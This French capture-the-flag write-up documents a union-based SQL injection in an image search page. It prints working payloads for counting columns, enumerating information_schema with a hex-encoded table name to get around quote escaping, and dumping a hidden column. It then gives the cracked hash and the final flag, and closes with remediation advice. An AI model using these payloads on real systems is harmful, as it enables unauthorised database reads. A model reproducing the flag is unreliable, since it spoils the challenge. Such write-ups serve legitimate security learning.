# Injection SQL - Union Based (Page Search Image)

## Description de la faille

La page `?page=searchimg` est vulnérable à une **Injection SQL** de type **Union-Based**. Le champ de recherche, destiné à filtrer des images par leur titre, ne désinfecte pas correctement les entrées utilisateur. Un attaquant peut injecter des commandes SQL pour forcer le serveur à retourner des données provenant de tables internes au lieu des métadonnées d'images prévues.

## Méthode d'exploitation

### 1. Identification du nombre de colonnes

En testant différentes longueurs de `UNION SELECT`, il a été déterminé que la requête initiale sélectionne **2 colonnes** (affichées via les champs "Title" et "Url").

* **Payload testé :** `1 UNION SELECT 1,2`

### 2. Énumération des tables et colonnes

En interrogeant la table `information_schema.tables`, une table nommée **`list_images`** a été identifiée. Pour lister ses colonnes sans utiliser de guillemets (souvent bloqués ou échappés), le nom de la table a été converti en hexadécimal :

* **`list_images` en hexadécimal :** `0x6c6973745f696d61676573`
* **Payload :** `1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573`

Cette étape a révélé l'existence d'une colonne nommée **`comment`**.

### 3. Extraction de l'indice

L'extraction du contenu de la colonne `comment` pour toutes les images a permis de découvrir un message caché derrière l'entrée "Hack me ?" :

* **Payload :** `1 UNION SELECT title, comment FROM list_images`
* **Résultat :** `If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

## Résolution du Flag

Conformément aux instructions trouvées dans la base de données :

1. **Décryptage MD5 :** Le hash `1928e8083cf461a51303633093573c46` correspond au mot `albatroz`.
2. **Traitement :** La chaîne est déjà en minuscules (`albatroz`).
3. **Génération du Flag final :** Calcul du SHA-256 via le terminal sans caractère de saut de ligne (`-n`) :
```bash
echo -n "albatroz" | sha256sum

```



**Flag :** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Pourquoi cela fonctionne ?

La vulnérabilité provient d'une mauvaise implémentation des requêtes de recherche (souvent de type `LIKE`). Le serveur concatène directement la saisie de l'utilisateur dans la chaîne de requête SQL. Bien que le serveur tente d'échapper les guillemets simples, il n'empêche pas l'utilisation de l'opérateur `UNION` ni l'utilisation de constantes hexadécimales, permettant ainsi une lecture totale de la base de données.

## Remédiation

* **Requêtes paramétrées :** Utiliser des requêtes préparées (Prepared Statements) pour que l'entrée utilisateur soit traitée comme une donnée et non comme une partie du code SQL.
* **Validation stricte :** Filtrer les caractères spéciaux et les mots-clés SQL (`UNION`, `SELECT`, `FROM`) dans les champs de recherche.
* **Masquage des erreurs :** Désactiver l'affichage des erreurs SQL détaillées pour ne pas donner d'indices sur la structure de la base à un attaquant.
